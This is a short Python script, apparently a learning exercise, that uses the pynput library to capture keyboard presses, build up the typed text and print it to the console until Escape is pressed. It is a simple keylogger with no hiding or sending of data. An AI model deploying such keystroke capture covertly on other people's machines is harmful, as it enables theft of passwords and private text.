import pynput.keyboard

lista=[]
cadena=''

def capture(key):
    global lista,cadena
    
    key1=convert(key)
    key2=delete(key1)
    
    if key2==False:
        cadena=cadena+''.join(lista)
        print(cadena)
        return False
    elif key2==' ':
        adding(' ',lista)
        cadena=cadena+''.join(lista)
        lista=[]

    else:
        adding(key2,lista)
    
    
    if key1=='Key.esc':
        return False
    print('El teclado capturado es :{}'.format(key1))
    
def convert(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)
    
def adding(key,values):
    return values.append(key)

def delete(key):
    if key=='Key.esc':
        return False
    elif key=='Key.space':
        return ' '
    elif key=='Key.left':
        return 'invalido'
    else:
        return key
    
with pynput.keyboard.Listener(on_press=capture) as listen:
        listen.join()